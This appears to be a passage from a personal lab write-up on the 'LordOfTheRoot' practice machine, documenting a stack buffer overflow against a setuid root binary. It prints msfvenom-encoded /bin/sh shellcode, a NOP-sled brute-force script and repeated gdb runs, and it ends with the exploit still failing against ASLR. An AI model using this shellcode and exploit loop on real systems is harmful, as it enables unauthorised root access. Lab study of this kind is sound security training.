0xffffd561:     0x0f0e0d0c      0x13121110      0x17161514      0x1b1a1918
```
- Let's remove these bad chars, and try again, then we have `20`:
```bash
pwndbg> x/8x 0xffffd280
0xffffd280:     0x04030201      0x08070605      0x0e0d0c0b      0x1211100f
0xffffd290:     0x16151413      0x1a191817      0x1e1d1c1b      0xf7fb001f
```
- Have to try again.
```bash

```
- From above we can see the bad char would break the whole testing codes, but after remove the bad chars, we can see the codes goes with out problem:
```bash
pwndbg> x/100x 0xffffd280
0xffffd280:     0x04030201      0x08070605      0x0e0d0c0b      0x1211100f
0xffffd290:     0x16151413      0x1a191817      0x1e1d1c1b      0x2322211f
0xffffd2a0:     0x27262524      0x2b2a2928      0x2f2e2d2c      0x33323130
0xffffd2b0:     0x37363534      0x3b3a3938      0x3f3e3d3c      0x43424140
0xffffd2c0:     0x47464544      0x4b4a4948      0x4f4e4d4c      0x53525150
0xffffd2d0:     0x57565554      0x5b5a5958      0x5f5e5d5c      0x63626160
0xffffd2e0:     0x67666564      0x6b6a6968      0x6f6e6d6c      0x73727170
0xffffd2f0:     0x77767574      0x7b7a7978      0x7f7e7d7c      0x83828180
0xffffd300:     0x87868584      0x8b8a8988      0x8f8e8d8c      0x93929190
0xffffd310:     0x97969594      0x9b9a9998      0x9f9e9d9c      0xa3a2a1a0
0xffffd320:     0xa7a6a5a4      0xabaaa9a8      0xafaeadac      0xb3b2b1b0
0xffffd330:     0xb7b6b5b4      0xbbbab9b8      0xbfbebdbc      0xc3c2c1c0
0xffffd340:     0xc7c6c5c4      0xcbcac9c8      0xcfcecdcc      0xd3d2d1d0
0xffffd350:     0xd7d6d5d4      0xdbdad9d8      0xdfdedddc      0xe3e2e1e0
0xffffd360:     0xe7e6e5e4      0xebeae9e8      0xefeeedec      0xf3f2f1f0
0xffffd370:     0xf7f6f5f4      0xfbfaf9f8      0xfffefdfc      0xffffd700
0xffffd380:     0xffffd815      0xffffd829      0xffffd83b      0xffffd8b8
0xffffd390:     0xffffd8d7      0xffffd8e8      0xffffded7      0xffffdefc                                  <<<<<    to 0xFF
0xffffd3a0:     0xffffdf0f      0xffffdf27      0xffffdf3f      0xffffdf4c
0xffffd3b0:     0xffffdf61      0xffffdf95      0xffffdfd6      0xffffdfdf
0xffffd3c0:     0x00000000      0x00000020      0xf7fd0550      0x00000021
0xffffd3d0:     0xf7fd0000      0x00000010      0x0f8bfbff      0x00000006
0xffffd3e0:     0x00001000      0x00000011      0x00000064      0x00000003
0xffffd3f0:     0x08048034      0x00000004      0x00000020      0x00000005
0xffffd400:     0x00000008      0x00000007      0xf7fd2000      0x00000008
```

- Now we have all the possible code chars, we can use them to generate shell code.
```bash
┌──(htb㉿kali)-[~]
└─$ msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of c file: 319 bytes
unsigned char buf[] =
"\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94"
"\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4"
"\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e"
"\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb";
```

- Follow the writeups, here's the next step:
	- Looks like we will have to write a large chunk of NOPs (no operation) to the stack, then randomly jump into the stack and slide down to our exploit code. Not the cleanest way to do things, but thankfully this isn't a "one shot at it" program. We can run it over and over until it works.
- Try luck stage, since we don't have the JMP/CALL ESP.
- We'll also try to disable ASLR (using ulimit) to get more predictable address space.
```bash
smeagol@LordOfTheRoot:~$ ulimit -s unlimited
```

- We'll use the following bash script to send our exploit code until we get a shell. Since the system is change the doors from time to time, we need to figure out which one is correct file:
```bash
smeagol@LordOfTheRoot:/SECRET$ find . -ls -exec file {} \; | grep file
 47106    8 -rwsr-xr-x   1 root     root         7370 Sep 17  2015 ./door2/file
./door2/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped
 47103    8 -rwsr-xr-x   1 root     root         5150 Sep 22  2015 ./door1/file
./door1/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped
 47105    8 -rwsr-xr-x   1 root     root         7370 Sep 17  2015 ./door3/file
./door3/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped
```

- We can see from SHA1 and file size that only the file with 5150 bytes is the correct file.
- And we will have to try to run this `file` program several times on victim machine to get the `EIP` address:
```bash
(gdb) r $(python -c 'print "A"*171')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /run/shm/file $(python -c 'print "A"*171')

Program received signal SIGILL, Illegal instruction.
0x40055a00 in __libc_start_main (main=0x804845d <main>, argc=2, argv=0xbffff6d4, init=0x80484b0 <__libc_csu_init>,
    fini=0x8048520 <__libc_csu_fini>, rtld_fini=0x4000f180 <_dl_fini>, stack_end=0xbffff6cc) at libc-start.c:246
246     libc-start.c: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff6b0:
 eip = 0x40055a00 in __libc_start_main (libc-start.c:246); saved eip = 0x8048381
 called by frame at 0x0
 source language c.
 Arglist at 0xbffff64c, args: main=0x804845d <main>, argc=2, argv=0xbffff6d4, init=0x80484b0 <__libc_csu_init>,
    fini=0x8048520 <__libc_csu_fini>, rtld_fini=0x4000f180 <_dl_fini>, stack_end=0xbffff6cc
 Locals at 0xbffff64c, Previous frame's sp is 0xbffff6b0
 Saved registers:
  ebx at 0xbffff69c, ebp at 0xbffff6a8, esi at 0xbffff6a0, edi at 0xbffff6a4, eip at 0xbffff6ac
```

- the `EIP` address should be `0x40055a00`, then we have this script:
```bash
smeagol@LordOfTheRoot:/dev/shm$ cat exploit.sh
#!/bin/bash
while true; do
  $(find /SECRET -type f -size 5150c) $(python -c 'print "A"*171 + "\x00\x5a\x05\x40" + "\x90"*20480 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"') 2> /dev/null
  sleep 1
done
```

- hmmmmmm, don't know why, esp address changed everytime, never got one time repeat for me to get luck:
```bash
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbf936400:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbfdb52b0:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbfd8d8b0:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbffc4540:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbfb83ec0:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbfeec050:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbfbde8d0:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbfe35d20:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbff80a30:     '\220' <repeats 200 times>...
(gdb) r $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /SECRET/door1/file $(python -c 'print "A"*171 + "B"*4 + "\x90"*2000 + "\xba\xd2\x61\x5d\xcc\xdb\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee\xfc\xe2\x27\x0b\x56\x94\x5e\x9e\x0e\x4c\x4d\x7c\x46\x6b\xe5\xad\x2b\x1c\xf5\xd9\xe4\xbe\x9c\x77\x72\xdd\x0c\x60\x8c\x22\xb0\x70\xa2\x40\xd9\x1e\x93\xf7\x71\xdf\xbc\xa4\x08\x3e\x8f\xcb"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbf904340:     '\220' <repeats 200 times>...
```

- I guess I give up........ but last time it did work. Can check oneNote writeup..... :'(

